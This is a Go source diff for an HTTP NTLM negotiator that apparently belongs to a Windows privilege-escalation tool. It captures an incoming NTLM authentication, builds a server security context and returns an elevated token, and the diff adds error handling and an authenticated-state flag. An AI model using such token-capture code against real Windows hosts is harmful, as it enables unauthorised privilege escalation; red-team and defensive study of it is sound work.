@@ -4,6 +4,7 @@ import (
 	"encoding/base64"
 	"fmt"
 	"net/http"
+	"os"
 	"strconv"
 	"syscall"
 	"unsafe"
@@ -13,17 +14,24 @@ import (
 )
 
 type HTTPNTLMNegotiator struct {
-	Host    string
-	Port    int
-	Context *ntlm.ServerContext
-	Chan    chan NegotiatorResult
+	Host          string
+	Port          int
+	Context       *ntlm.ServerContext
+	Chan          chan NegotiatorResult
+	Authenticated bool
 }
 
 func (negotiator HTTPNTLMNegotiator) Serve() NegotiatorResult {
 
-	go http.ListenAndServe(negotiator.Host+":"+strconv.Itoa(negotiator.Port), &negotiator)
+	go func() {
+		err := http.ListenAndServe(negotiator.Host+":"+strconv.Itoa(negotiator.Port), &negotiator)
+		if err != nil {
+			fmt.Println("[!] Failed to start HTTP server. Double check your arguments.")
+			os.Exit(-1)
+		}
+	}()
 
-	fmt.Println("[+] Started HTTP NTLM negotiator")
+	fmt.Println("[+] Started HTTP NTLM negotiator at " + negotiator.Host + ":" + strconv.Itoa(negotiator.Port))
 	result := <-negotiator.Chan
 
 	return result
@@ -36,12 +44,12 @@ func (negotiator HTTPNTLMNegotiator) Trigger() bool {
 func (negotiator *HTTPNTLMNegotiator) ServeHTTP(res http.ResponseWriter, req *http.Request) {
 	ntlmHash := req.Header.Get("Authorization")
 
-	if len(ntlmHash) == 0 {
+	if len(ntlmHash) == 0 && !negotiator.Authenticated {
 		negotiator.Context.Release()
 		res.Header().Set("WWW-Authenticate", "NTLM")
 		res.WriteHeader(http.StatusUnauthorized)
 		fmt.Println("[+] " + req.RemoteAddr + " connect")
-	} else {
+	} else if !negotiator.Authenticated {
 		bytes, err := base64.StdEncoding.DecodeString(ntlmHash[5:])
 		ntlmLoc := ParseNTLM(bytes)
 		ntlmBytes := bytes[ntlmLoc : len(bytes)-ntlmLoc]
@@ -66,7 +74,7 @@ func (negotiator *HTTPNTLMNegotiator) ServeHTTP(res http.ResponseWriter, req *ht
 			negotiator.Context = context
 
 			if err != nil {
-				fmt.Println("[!] Could not create new server context")
+				fmt.Println("[!] Could not create new server context ", err)
 				return
 			}
 
@@ -77,7 +85,7 @@ func (negotiator *HTTPNTLMNegotiator) ServeHTTP(res http.ResponseWriter, req *ht
 			err = negotiator.Context.Update(ntlmBytes)
 
 			if err != nil {
-				fmt.Println("[!] Couldn't complete NTLM authentication")
+				fmt.Println("[!] Couldn't complete NTLM authentication ", err)
 				return
 			}
 
@@ -93,9 +101,11 @@ func (negotiator *HTTPNTLMNegotiator) ServeHTTP(res http.ResponseWriter, req *ht
 				negotiator.Chan <- NegotiatorResult{nil, err}
 				return
 			}
-
+			negotiator.Authenticated = true
 			negotiator.Chan <- NegotiatorResult{&elevatedToken, nil}
 		}
+	} else {
+		res.WriteHeader(http.StatusNotFound)
 	}
 }
 
